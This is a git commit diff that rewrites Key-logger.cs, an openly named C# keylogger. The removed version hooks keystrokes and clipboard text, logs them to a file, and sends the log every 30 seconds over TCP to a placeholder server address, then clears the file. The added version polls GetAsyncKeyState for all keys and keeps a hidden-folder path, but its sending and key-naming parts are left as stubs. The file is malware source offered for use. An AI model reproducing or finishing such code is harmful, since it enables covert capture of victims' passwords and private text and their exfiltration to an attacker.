7df20b4d7863a60125be7b150eb3871ccc602553
Self$-was-here <danieldesaparecera@gmail.com>
2025-03-24 10:45:03 +0100

    Update Key-logger.cs

--- Key-logger.cs
+++ Key-logger.cs
@@ -1,197 +1,68 @@
 using System;
+using System.Collections.Generic;
 using System.IO;
-using System.Net.Sockets;
-using System.Threading;
-using System.Windows.Forms;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
 
-class Program
+public class Keylogger
 {
+    private int _intervaloEnvio;
+    private string _rutaCarpetaOculta;
+    private DateTime _ultimaHoraEnviada = DateTime.Now;
+    private readonly Dictionary<int, bool> _estadosTeclas = new();
 
-    static string ipServer = "Ip server Aqui";
-    static int port = 5000;
-    static string fileSave = "save.txt";
-    static int timeInterval = 30;
-    static string dataCp = "";
-
-
-
-    static void Capture(KeyPressEventArgs e) 
+    public Keylogger(int intervaloEnvio, string rutaCarpetaOculta)
     {
-        try
-        {
-            using (StreamWriter sw = new StreamWriter(fileSave, true))
-            {
-                sw.Write(e.KeyChar);
-            }
-        }
-        catch (Exception)
-        {
-            if (e.Key == Keys.Space) 
-            {
-                using (StreamWriter sw = new StreamWriter(fileSave, true))
-                {
-                    sw.Write(' ');
-                }
-            }
-            else if (e.Key == Keys.Tab) 
-            {
-                using (StreamWriter sw = new StreamWriter(fileSave, true))
-                {
-                    sw.Write('\t');
-                }
-            }
-            else if (e.Key == Keys.Back) 
-            {
-                using (StreamWriter sw = new StreamWriter(fileSave, true))
-                {
-                    sw.Write(" <backspace> ");
-                }
-            }
-            else if (e.Key == Keys.Enter)
-            {
-                using (StreamWriter sw = new StreamWriter(fileSave, true))
-                {
-                    sw.Write(Environment.NewLine);
-                }
-            }
-        }
+        _intervaloEnvio = intervaloEnvio;
+        _rutaCarpetaOculta = rutaCarpetaOculta;
     }
 
-    static void Send(TcpClient clientSocket) 
-    {
-        int compt = 0;
-        try
-        {
-            string fileData = File.ReadAllText(fileSave);
-
-            if (!string.IsNullOrEmpty(fileData))
-            {
-                NetworkStream networkStream = clientSocket.GetStream();
-                byte[] data = System.Text.Encoding.UTF8.GetBytes(fileData);
-                networkStream.Write(data, 0, data.Length);
-                Console.WriteLine("--> sending <--");
-
-                File.WriteAllText(fileSave, string.Empty); 
-                Console.WriteLine("--> cleaning <--\n");
-            }
-            else
-            {
-                Console.WriteLine("--> empty file <--\n");
-            }
-        }
-        catch (Exception)
-        {
-            Console.WriteLine("Error: cannot send file to the server...");
-            compt++;
-            if (compt > 4) 
-            {
-                Environment.Exit(1);
-            }
-            else
-            {
-                Thread.Sleep(120000); 
-            }
-        }
-    }
-
-    static TcpClient Connect() 
-    {
-        int compt = 0;
-        TcpClient clientSocket = new TcpClient();
-        while (true)
-        {
-            try
-            {
-                clientSocket.Connect(ipServer, port);
-                Console.WriteLine("Client connecté au serveur.");
-                return clientSocket;
-            }
-            catch (Exception)
-            {
-                Console.WriteLine("Error: cannot connect to the server...");
-                compt++;
-                if (compt > 4) 
-                {
-                    Environment.Exit(1);
-                }
-                else
-                {
-                    Thread.Sleep(120000); 
-                }
-            }
-        }
-    }
-
-
-
-    static void ClipboardSave() 
-    {
-        string data = Clipboard.GetText();
-        if (!string.IsNullOrEmpty(data) && data != dataCp)
-        {
-            using (StreamWriter sw = new StreamWriter(fileSave, true))
-            {
-                sw.WriteLine("\n---\nClipboard: " + data + " \n---\n");
-            }
-            dataCp = data;
-        }
-    }
-
-
-    static void Main(string[] args)
+    public async Task IniciarAsync()
     {
         while (true)
         {
-            TcpClient clientSocket = Connect();
-            HookKeyboard();
-            while (true)
+            for (int tecla = 0; tecla <= 255; tecla++)
             {
-                try
+                bool teclaPresionada = EsTeclaPresionada(tecla);
+                if (teclaPresionada && !_estadosTeclas.ContainsKey(tecla))
                 {
-                    Thread.Sleep(timeInterval * 1000);
-                    ClipboardSave();
-                    Send(clientSocket);
+                    string nombreTecla = ObtenerNombreTecla(tecla);
+                    if (!string.IsNullOrEmpty(nombreTecla) && !EsTeclaControl(tecla))
+                    {
+                        Console.WriteLine($"Tecla capturada: {nombreTecla}");
+                    }
+                    _estadosTeclas[tecla] = true;
                 }
-                catch (ThreadInterruptedException)
+                else if (!teclaPresionada && _estadosTeclas.ContainsKey(tecla))
                 {
-                    Console.WriteLine(">>> stop <<<");
-                    break;
-                }
-                catch (Exception)
-                {
-                    Console.WriteLine("Error: the client can't send to the server");
-                    clientSocket.Close();
-                    break;
+                    _estadosTeclas.Remove(tecla);
                 }
             }
+
+            if ((DateTime.Now - _ultimaHoraEnviada).TotalSeconds >= _intervaloEnvio)
+            {
+                _ultimaHoraEnviada = DateTime.Now;
+            }
+
+            await Task.Delay(50);
         }
     }
 
-
-    private static void HookKeyboard()
+    private bool EsTeclaPresionada(int tecla)
     {
-        KeyboardHook.Start();
-        KeyboardHook.KeyPress += Capture;
-    }
-}
-
-public static class KeyboardHook
-{
-    public static event KeyPressEventHandler KeyPress;
-
-    public static void Start()
-    {
-        Application.EnableVisualStyles();
-        Application.SetCompatibleTextRenderingDefault(false);
-        Application.Run(new KeyListener());
+        return (GetAsyncKeyState(tecla) & 0x8000) != 0;
     }
 
-    private class KeyListener : Form
+    private bool EsTeclaControl(int tecla)
     {
-        protected override void OnKeyPress(KeyPressEventArgs e)
-        {
-            KeyPress?.Invoke(this, e);
-            base.OnKeyPress(e);
-        }
+        return tecla == 16 || tecla == 17 || tecla == 18;
     }
+
+    private string ObtenerNombreTecla(int tecla)
+    {
+        return string.Empty; 
+    }
+
+    [DllImport("user32.dll")]
+    public static extern short GetAsyncKeyState(int vKey);
 }
